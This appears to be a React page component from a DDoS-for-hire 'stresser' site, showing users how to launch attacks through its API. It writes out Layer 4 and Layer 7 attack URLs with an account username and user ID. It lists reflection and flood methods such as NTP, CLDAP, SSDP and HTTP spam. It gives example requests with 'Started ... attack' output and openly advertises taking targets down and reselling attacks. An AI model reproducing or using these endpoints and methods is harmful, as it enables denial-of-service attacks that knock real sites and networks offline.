import React, {useEffect, useRef, useState} from 'react';
import {FusePageSimple} from '@fuse';
import {useDispatch, useSelector} from 'react-redux';
import withReducer from 'app/store/withReducer';
import * as Actions from './store/actions'
import reducer from './store/reducers';
import _ from 'lodash';
import {
    fade,
    withStyles,
  } from '@material-ui/core/styles';
import {
    InputBase,
    Card,
    CardContent,
    Typography,
} from '@material-ui/core';

const BootstrapInput = withStyles(theme => ({
    root: {
      'label + &': {
        marginTop: theme.spacing(3),
      },
      width: '100%'
    },
    input: {
      borderRadius: 4,
      position: 'relative',
      backgroundColor: '#150e0e73',
      color: '#fff',
      border: '0px solid #a2a2a2',
      fontSize: 16,
      width: '100%',
      padding: '10px 12px',
    //   transition: theme.transitions.create(['border-color', 'box-shadow']),
      transition: 'border-color .15s ease-in-out,box-shadow .15s ease-in-out',
      fontFamily: [
        '-apple-system',
        'BlinkMacSystemFont',
        '"Segoe UI"',
        'Roboto',
        '"Helvetica Neue"',
        'Arial',
        'sans-serif',
        '"Apple Color Emoji"',
        '"Segoe UI Emoji"',
        '"Segoe UI Symbol"',
      ].join(','),
      '&:focus': {
        boxShadow: `${fade(theme.palette.primary.main, 0.25)} 0 0 0 0.2rem`,
        border: '3px solid #a2a2a2',
        backgroundColor: '#00000033',
        margin: '-3px'
      },
    },
  }))(InputBase);

function APIMangerApp(props)
{
    const dispatch = useDispatch();
    const pageLayout = useRef(null);

    useEffect(() => {
        dispatch(Actions.customAction());
    }, [dispatch]);

    return (
        <FusePageSimple
            content={
                <React.Fragment>
                    <br/>
                    <center className="text-15 text-white">STRESSER.CC API its a way to launch stress test attacks without having to open / log in to your account, useful for automated attacks or to resell our services. (Or just a faster way to take your target down!)</center>
                    <br/>

                    <Card elevation={1} className="flex flex-col text-white mb-24" style={{backgroundColor: '#00000033'}}>
                        <CardContent className='p-20'>
                            <Typography className="font-medium truncate" color="inherit">LAYER 4</Typography>
                            <br/>
                            <br/>
                            <BootstrapInput
                                className="w-full"
                                defaultValue="https://stresser.cc/apis/l4api.php?username=v3rdad&password=PASSWORD&userid=RYGD-ONVK-SIPO-IXBE&premium=0&target=IPV4&method=METHOD&time=TIME&port=PORT"
                                id="bootstrap-input"
                                inputProps={{
                                    readOnly: true,
                                }}/>
                            <br/>
                            <br/>
                            <Typography className="font-medium truncate" color="inherit">LAYER 7</Typography>
                            <br/>
                            <br/>
                            <BootstrapInput
                                className="w-full"
                                defaultValue="https://stresser.cc/apis/l7api.php?username=v3rdad&password=PASSWORD&userid=RYGD-ONVK-SIPO-IXBE&premium=0&target=URL&method=METHOD&time=TIME"
                                id="bootstrap-input"
                                inputProps={{
                                    readOnly: true,
                                }}/>
                            <br/>
                            <br/>
                        </CardContent>
                    </Card>
                    
                    <center style={{fontWeight: 'bold', color: 'white', fontSize: '15px'}}>
                        <br/>
                        <b>Layer 7 methods</b>
                        <br/>
                        <ul>	
                            <li>'SPAMGET' =&gt; HTTP-SPAM [GET]</li>
                            <li>'SPAMPOST' =&gt; HTTP-SPAM [POST]</li>
                            <li>'CAPTCHA' =&gt; HTTP-CAPTCHA</li>
                            <li>'MULTIBYPASS' =&gt; MULTIBYPASS</li>
                        </ul>
                        <br/>
                        <b>Layer 4 methods</b>
                        <br/>
                        <ul>  
                            <li>'NTP' =&gt; UDP-NTP</li>
                            <li>'SSDP' =&gt; UDP-SSDP</li>
                            <li>'SNMP' =&gt; UDP-SNMP</li>
                            <li>'MSSQL' =&gt; UDP-MSSQL</li>
                            <li>'CLDAP' =&gt; UDP-CLDAP</li>
                            <li>'TCPVOX' =&gt; TCP-VOX</li>
                            <li>'TCPRAND' =&gt; TCP-KYS</li>
                            <li>'CHARGEN' =&gt; UDP-CHARGEN</li>
                            <li>'SENTINEL' =&gt; UDP-SENTINEL</li>
                            <li>'UDPBYPASS' =&gt; UDP-BYPASS</li>
                            <li>'TCPBYPASS' =&gt; TCP-BYPASS</li>
                        </ul>
                        <br/>
                        <ul>
                            <li>'STOP' =&gt; STOP method must be used with the target you want to stop the attack on</li>
                            <br/>
                            <li>PREMIUM =&gt; 0 = NO (disabled) and 1 = YES (enabled) premium=1 or premium=0</li>
                        </ul>
                        <br/>
                        <br/>
                    </center>

                    <Card elevation={1} className="flex flex-col text-white mb-24" style={{backgroundColor: '#00000033'}}>
                        <CardContent className='p-20'>
                            <Typography className="font-medium truncate" color="inherit">LAYER 4 EXAMPLE</Typography>
                            <br/>
                            <br/>
                            <BootstrapInput
                                className="w-full"
                                defaultValue="https://stresser.cc/apis/l4api.php?username=v3rdad&password=mypassword123&userid=RYGD-ONVK-SIPO-IXBE&premium=1&target=192.168.0.1&method=CLDAP&time=120&port=80"
                                id="bootstrap-input"
                                inputProps={{
                                    readOnly: true,
                                }}/>
                            <br/>
                            <br/>
                            <Typography className="font-medium truncate" color="inherit">Started UDP-CLDAP attack on 192.168.0.1</Typography>
                            <br/>
                            <br/>
                            <Typography className="font-medium truncate" color="inherit">LAYER 7 EXAMPLE</Typography>
                            <br/>
                            <br/>
                            <BootstrapInput
                                className="w-full"
                                defaultValue="https://stresser.cc/apis/l7api.php?username=v3rdad&password=mypassword123&userid=RYGD-ONVK-SIPO-IXBE&premium=1&target=https://mywebsite.com&method=SPAMGET&time=120"
                                id="bootstrap-input"
                                inputProps={{
                                    readOnly: true,
                                }}/>
                            <br/>
                            <br/>
                            <Typography className="font-medium truncate" color="inherit">Started HTTP-SPAM [GET] attack on https://mywebsite.com</Typography>
                            <br/>
                            <br/>
                            <Typography className="font-medium truncate" color="inherit">STOP EXAMPLE</Typography>
                            <br/>
                            <br/>
                            <BootstrapInput
                                className="w-full"
                                defaultValue="https://stresser.cc/apis/l7api.php?username=v3rdad&password=mypassword123&userid=RYGD-ONVK-SIPO-IXBE&premium=1&target=https://mywebsite.com&method=STOP&time=120"
                                id="bootstrap-input"
                                inputProps={{
                                    readOnly: true,
                                }}/>
                            <br/>
                            <br/>
                            <Typography className="font-medium truncate" color="inherit">Stopped attack on https://mywebsite.com</Typography>
                        </CardContent>
                    </Card>

                </React.Fragment>
            }
            ref={pageLayout}
        />
    );
}

export default withReducer('apiMangerApp', reducer)(APIMangerApp);
